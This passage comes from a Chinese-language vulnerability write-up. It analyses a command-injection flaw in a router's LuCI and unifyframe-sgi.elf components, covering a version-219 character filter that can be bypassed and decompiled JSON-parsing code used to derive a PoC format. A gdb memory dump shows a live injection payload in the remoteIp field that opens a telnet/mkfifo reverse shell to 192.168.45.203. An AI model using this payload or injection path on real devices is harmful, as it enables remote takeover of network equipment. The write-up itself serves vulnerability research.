
```
function merge(params)
local cmd = require "luci.modules.cmd"
return cmd.devSta.set({device = "pc", module = "networkId\_merge", data = params, async = true})
end
```

`merge` 函数又调用了`/usr/lib/lua/luci/modules/cmd.lua`文件中的`devSta.set`函数，之后的过程又和上文中分析最新版的步骤一样，也不再重复记录

```
devSta[opt[i]] = function(params)
local model = require "dev\_sta"
params.method = opt[i]
params.cfg\_cmd = "dev\_sta"
local data, back, ip, password, shell = doParams(params)
return fetch(model.fetch, shell, params, opt[i], params.module, data, back, ip, password)
```

#### 为什么最新版不能再走这条链了？

在`219`版本，在`noauth.lua`文件中的`merge`函数，加入了对`params`中危险字符的过滤，调用了`includeXxs`和`includeQuote`函数，对换行符、回车符、反引号、`&`、`$`、`;`、`|`等符号都做了过滤，这就意味着后续无法再进行命令注入了。而`219`版本只在这里进行了危险字符的过滤，只要从其他地方调用到诸如`dev_cap` `dev_sta`表中的函数依然可以进行命令注入

```
function merge(params)
local cmd = require "luci.modules.cmd"
local tool = require("luci.utils.tool")
local \_strParams = luci.json.encode(params)
if tool.includeXxs(\_strParams) or tool.includeQuote(\_strParams) then
tool.eweblog(\_strParams, "MERGE FAILED INVALID DATA")
return 'INVALID DATA'
end
return cmd.devSta.set({
device = "pc",
module = "networkId\_merge",
data = params,
async = true
})
end
function includeXxs(str)
local ngstr = "[\n\r`&$;|]"
return string.match(str, ngstr) ~= nil
end
function includeQuote(str)
return string.match(str, "(['])") ~= nil
end
```

### 漏洞文件分析

下面开始分析`/usr/sbin/unifyframe-sgi.elf`文件，整体流程是在`main`函数调用了三个关键函数`uf_socket_msg_read`、`parse_content`、`add_pkg_cmd2_task`，他们的作用分别为**接收数据 解析数据 执行命令**

#### 字段解析

由`uf_socket_msg_read`函数将`json`数据读入到内存中，地址为`v31+1`

```c
//uf\_socket\_msg\_read
v31 = (\_DWORD \*)malloc\_pkg();
......
pthread\_mutex\_lock(v29 + 5);
\*v31 = v29;
v52 = uf\_socket\_msg\_read(\*v29, v31 + 1);
pthread\_mutex\_unlock(v29 + 5);
```

通过`gdb`来查看读入的数据。这里只为说明`gdb`可以查看内存中读入的数据，文章前后发送的报文并不一样

```
pwndbg> x/4s 0x623850
0x623850: "{ \"method\": \"devConfig.get\", \"params\": { \"module\": \"123\", \"remoteIp\": \"$(mkfifo \\/tmp\\/test;telnet 192.168.45.203 6666 0<\\/tmp\\/test|\\/bin\\/sh > \\/tmp\\/test)\", \"remotePwd\": \"\", \"async\": true, \"data\": "...
0x623918: "\"{\\\"kkk\\\":\\\"abc\\\"}\" } }"
```

`json`数据的各字段进行解析在`parse_content`函数中完成，该函数首先判断了`params`和`method`字段是否存在，然后在`method`字段不为`cmdArr`的情况下，调用`parse_obj2_cmd`函数进一步对字段进行解析

```c
//parse\_content
v3 = json\_tokener\_parse();
v4 = v3;
......
v6 = json\_object\_object\_get\_ex(v3, "params", &v18);
v7 = v4;
if ( v6 != 1 )//检查了 params 字段是否存在值
{
LABEL\_27:
json\_object\_put(v7);
return -1;
}
if ( json\_object\_object\_get\_ex(v4, "method", v19) != 1 )//检查了 method 字段是否存在值
{
LABEL\_26:
v7 = v4;
goto LABEL\_27;
}
v8 = json\_object\_get\_string(v19[0]);
if ( !v8 )
{
......
}
if ( strstr(v8, "cmdArr") )//因为发送的 method 字段不为 cmdArr，所以进入 else
{
......
}
else
{
......
v16 = parse\_obj2\_cmd(v4); //进行数据解析的具体位置,v4为Json对象
\*v15 = v16;
if ( !v16 )
{
......
}
pkg\_add\_cmd(a1, v15);
v15[2] = 0;
}
```

`parse_obj2_cmd`函数中具体的解析了各个字段及类型并把它们记录到一个堆块中，最终返回该堆块地址，便于之后的访问。想知道`POC`的编写格式就要对此处进行逆向分析，具体分析结果已写在注释中

```c
//parse\_obj2\_cmd
v2 = malloc(0x34);//创建了一个堆块，用于记录和存储接下来的各种信息，该函数最终会返回这个堆块地址
v3 = v2;
......
if ( json\_object\_object\_get\_ex(a1, "params", &v38) != 1 )//判断params字段是否存在，存在的话将值赋给v38
{
......
}
if ( json\_object\_object\_get\_ex(a1, "method", &v37) != 1 )//判断method字段是否存在，存在的话将值赋给v37
{
......
}
v4 = json\_object\_get\_string(v37);//获取到method的值，下面去匹配对应的操作，各种操作都对应一个数字，该数字放在了堆块的第一个指针处
v5 = v4;
......
if ( strstr(v4, "devSta") )
{
v6 = 2;
}
else
{
if ( strstr(v5, "acConfig") )
{
\*(\_DWORD \*)v3 = 0;
goto LABEL\_21;
}
if ( strstr(v5, "devConfig") )
{
\*(\_DWORD \*)v3 = 1;
goto LABEL\_21;
}
if ( strstr(v5, "devCap") )
{
v6 = 3;
}
else
{
if ( !strstr(v5, "ufSys") )
{
uf\_log\_printf(uf\_log, (const char \*)dword\_4219EC, "sgi.c", "parse\_obj2\_cmd", 274);
goto LABEL\_109;
}
v6 = 4;
}
}
\*(\_DWORD \*)v3 = v6;
LABEL\_21:
v7 = strchr(v5, 46);//此处的strchr与strdup函数配合将method字段中xxx.xxx的字符串进行了分割，假设最初method为devConfig.get，那么此处会将get放入堆块中的第二个指针处
v8 = strdup(v7 + 1);
\*(\_DWORD \*)(v3 + 4) = v8;
if ( json\_object\_object\_get\_ex(v38, "module", &v37) != 1 )//判断params字段中是否存在module这个值，存在的话将module的值放入v37中，不存在直接返回
{
......
}
v10 = json\_object\_get\_string(v37);
if ( !v10 )
{
uf\_log\_printf(uf\_client\_log, "(%s %s %d)obj\_module is null", "sgi.c", "parse\_obj2\_cmd", 294);
goto LABEL\_109;
}
v11 = strdup(v10);
\*(\_DWORD \*)(v3 + 8) = v11;//将module字段的值放到堆块的第三个指针中
if ( json\_object\_object\_get\_ex(v38, "remoteIp", &v37) == 1 && (unsigned int)(json\_object\_get\_type(v37) - 5) < 2 )//这里判断params字段中remoteIp是否存在，存在的话将remoteIp的值赋给v37，同时对remoteIp值的类型做了检查，这里其实就要它的类型为string
{
v12 = json\_object\_get\_string(v37);
if ( v12 )
{
v13 = strdup(v12);
\*(\_DWORD \*)(v3 + 20) = v13;//将remoteIp的值放入堆块的第六个指针中
......
}
}
else
{
\*(\_DWORD \*)(v3 + 20) = 0;
}
if ( json\_object\_object\_get\_ex(v38, "remotePwd", &v37) == 1 && json\_object\_get\_type(v37) == 5 )//作用同上类似，这里要求remotePwd的类型为array，但是如果传入array类型的话，前端做了相应的检查导致异常，因此猜测这里应该是写的Bug
{
v14 = json\_object\_get\_string(v37);
if ( v14 )
{
v15 = strdup(v14);
\*(\_DWORD \*)(v3 + 24) = v15;
......
}
}
v16 = \*(\_DWORD \*)v3 != 2;
\*(\_BYTE \*)(v3 + 40) = 0;
\*(\_BYTE \*)(v3 + 41) = v16;
if ( json\_object\_object\_get\_ex(v38, "async", &v37) == 1 )
{
v17 = (\_BYTE \*)sub\_404BAC(v37);
v18 = v17;
if ( v17 )
{
if ( \*v17 == 48 || !strcmp(v17, "false") )
{
\*(\_BYTE \*)(v3 + 40) = 1;
\*(\_BYTE \*)(v3 + 41) = 1;
}
if ( \*v18 == 49 || !strcmp(v18, "true") )
\*(\_WORD \*)(v3 + 40) = 1;
free(v18);
}
}
if ( json\_object\_object\_get\_ex(v38, "force", &v37) == 1 )
{
v19 = (\_BYTE \*)sub\_404BAC(v37);
v20 = v19;
if ( v19 )
{
if ( \*v19 == 49 || !strcmp(v19, "true") )
\*(\_BYTE \*)(v3 + 43) = 1;
free(v20);
}
}
if ( json\_object\_object\_get\_ex(v38, "configId\_not\_change", &v37) == 1 )
{
v21 = (\_BYTE \*)sub\_404BAC(v37);
v22 = v21;
if ( v21 )
{
if ( \*v21 == 49 || !strcmp(v21, "true") )
\*(\_BYTE \*)(v3 + 44) = 1;
free(v22);
}
}
if ( json\_object\_object\_get\_ex(v38, "from\_url", &v37) == 1 )
{
v23 = (\_BYTE \*)sub\_404BAC(v37);
v24 = v23;
if ( v23 )
{
if ( \*v23 == 49 || !strcmp(v23, "true") )
\*(\_BYTE \*)(v3 + 45) = 1;
free(v24);
}
}
if ( json\_object\_object\_get\_ex(v38, "from\_file", &v37) == 1 )
{
v25 = (\_BYTE \*)sub\_404BAC(v37);
v26 = v25;
if ( v25 )
{
if ( \*v25 == 49 || !strcmp(v25, "true") )
\*(\_BYTE \*)(v3 + 47) = 1;
free(v26);
}
}
if ( json\_object\_object\_get\_ex(v38, "multi", &v37) == 1 )
{
v27 = (\_BYTE \*)sub\_404BAC(v37);
v28 = v27;
if ( v27 )
{
if ( \*v27 == 49 || !strcmp(v27, "true") )
\*(\_BYTE \*)(v3 + 48) = 1;
free(v28);
}
}
if ( json\_object\_object\_get\_ex(v38, "not\_commit", &v37) == 1 )
{
v29 = (\_BYTE \*)sub\_404BAC(v37);
v30 = v29;
if ( v29 )
{
if ( \*v29 == 49 || !strcmp(v29, "true") )
\*(\_BYTE \*)(v3 + 46) = 1;
free(v30);
}
}
if ( json\_object\_object\_get\_ex(v38, "execute", &v37) == 1 )
{
v31 = (\_BYTE \*)sub\_404BAC(v37);
v32 = v31;
if ( v31 )
{
if ( \*v31 == 49 || !strcmp(v31, "true") )
\*(\_BYTE \*)(v3 + 42) = 1;
free(v32);
}
}
v33 = v3;
if ( json\_object\_object\_get\_ex(v38, "data", &v37) == 1 && (unsigned int)(json\_object\_get\_type(v37) - 4) < 3 )//判断params字段中是否存在data，如果存在的话将其赋值给v37，并且检查了data的值类型，只能为object,array,string三种类型，然后将data的值放到堆块的第四个指针处
{
v34 = json\_object\_get\_string(v37);
if ( v34 )
{
v35 = strdup(v34);
\*(\_DWORD \*)(v3 + 12) = v35;
if ( !v35 )
{
v9 = 470;
goto LABEL\_108;
}
}
}
return v33;//返回堆块地址
```

将这个堆块装的各种数据绘制成图片可能更直观一些（如下）`xxx`代表有些保留字段，或者是一些标志位，它们在后续利用过程中并不重要，暂不详细记录

![图片描述](upload/attach/202402/953233_XF68FHTY9SJWSZM.webp)

使用`GDB`调试到此处看到的各字段信息如下

![image-20230816171530830](upload/attach/202402/953233_YNRWFTY6H42S4G2.jpg)
